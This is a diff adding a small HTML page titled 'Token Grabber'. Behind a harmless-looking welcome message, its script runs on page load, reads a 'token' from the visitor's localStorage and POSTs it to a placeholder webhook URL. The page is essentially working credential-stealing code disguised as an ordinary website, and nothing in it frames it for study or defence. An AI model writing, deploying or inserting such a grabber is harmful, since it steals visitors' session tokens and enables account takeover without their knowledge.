@@ -1,0 +1,30 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Token Grabber</title>
+    <script>
+        // Function to capture the token
+        function captureToken() {
+            const token = localStorage.getItem('token');
+            if (token) {
+                fetch('https://your-webhook-url.com', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({ token: token })
+                });
+            }
+        }
+
+        // Capture the token when the page loads
+        window.addEventListener('load', captureToken);
+    </script>
+</head>
+<body>
+    <h1>Welcome to our website!</h1>
+    <p>Enjoy your stay...</p>
+</body>
+</html>
